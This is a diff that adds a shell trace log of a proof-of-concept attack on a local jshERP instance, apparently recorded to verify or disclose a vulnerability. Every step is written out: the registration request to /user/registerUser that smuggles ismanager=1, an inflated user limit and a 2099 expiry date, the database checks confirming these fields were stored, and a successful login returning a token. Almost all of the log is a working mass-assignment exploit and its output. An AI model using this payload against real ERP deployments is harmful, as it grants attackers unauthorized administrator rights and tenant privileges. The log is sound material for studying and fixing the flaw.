@@ -1,0 +1,107 @@
++ set -e
++ BASE=http://127.0.0.1:9999/jshERP-boot
+++ date +%s
++ U=pocma1772428463
++ P=e10adc3949ba59abbe56e057f20f883e
+++ cat
++ PAYLOAD='{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
++ step '1) 查看注册前数据库基线'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 1) 查看注册前数据库基线'
+[STEP] 1) 查看注册前数据库基线
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+11
+9
++ step '2) 发起注册请求（携带敏感字段）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 2) 发起注册请求（携带敏感字段）'
+[STEP] 2) 发起注册请求（携带敏感字段）
++ echo ==============================
+==============================
++ echo '[Payload]'
+[Payload]
++ echo '{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
+{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}
++ post_register '{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
++ payload='{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
++ echo '+ docker exec -i jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/registerUser'\'' -H '\''Content-Type: application/json'\'' --data-binary @-"'
++ docker exec -i jsherp33-app sh -lc "curl -s -X POST 'http://127.0.0.1:9999/jshERP-boot/user/registerUser' -H 'Content-Type: application/json' --data-binary @-"
++ printf %s '{"loginName":"pocma1772428463","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}'
++ docker exec -i jsherp33-app sh -lc 'curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/registerUser'\'' -H '\''Content-Type: application/json'\'' --data-binary @-'
+{"msg":"操作成功","code":200}+ echo
+
++ step '3) 查看注册后用户表状态（重点看 ismanager）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 3) 查看注册后用户表状态（重点看 ismanager）'
+[STEP] 3) 查看注册后用户表状态（重点看 ismanager）
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='\''pocma1772428463'\'';\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='\''pocma1772428463'\'';\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='pocma1772428463';\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='\''pocma1772428463'\'';\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+140	pocma1772428463	1	0	0	140
++ step '4) 查看注册后租户表状态（重点看 user_num_limit/expire_time）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 4) 查看注册后租户表状态（重点看 user_num_limit/expire_time）'
+[STEP] 4) 查看注册后租户表状态（重点看 user_num_limit/expire_time）
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='\''pocma1772428463'\'';\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='\''pocma1772428463'\'';\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='pocma1772428463';\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='\''pocma1772428463'\'';\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+140	pocma1772428463	9999999	2099-12-31 23:59:59	poc-mass-assignment
++ step '5) 登录该新账号，确认可直接使用'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 5) 登录该新账号，确认可直接使用'
+[STEP] 5) 登录该新账号，确认可直接使用
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/login'\'' -H '\''Content-Type: application/json'\'' -d '\''{\"loginName\":\"pocma1772428463\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'\''"'
++ echo '+ docker exec jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/login'\'' -H '\''Content-Type: application/json'\'' -d '\''{\"loginName\":\"pocma1772428463\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'\''"'
++ docker exec jsherp33-app sh -lc "curl -s -X POST 'http://127.0.0.1:9999/jshERP-boot/user/login' -H 'Content-Type: application/json' -d '{\"loginName\":\"pocma1772428463\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'"
++ sh -c 'docker exec jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/login'\'' -H '\''Content-Type: application/json'\'' -d '\''{\"loginName\":\"pocma1772428463\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'\''"'
+{"code":200,"data":{"user":{"id":140,"username":"pocma1772428463","loginName":"pocma1772428463","password":null,"leaderFlag":"0","position":null,"department":null,"email":null,"phonenum":null,"ismanager":1,"isystem":0,"status":0,"description":null,"remark":"poc-mass-assignment","weixinOpenId":null,"tenantId":140},"msgTip":"user can login","token":"f4245e266a85479b9be970bfda4e1880_140"}}+ step '6) 最终数据库状态汇总'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 6) 最终数据库状态汇总'
+[STEP] 6) 最终数据库状态汇总
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+12
+10
++ echo
+
++ echo '[Context] username=pocma1772428463'
+[Context] username=pocma1772428463
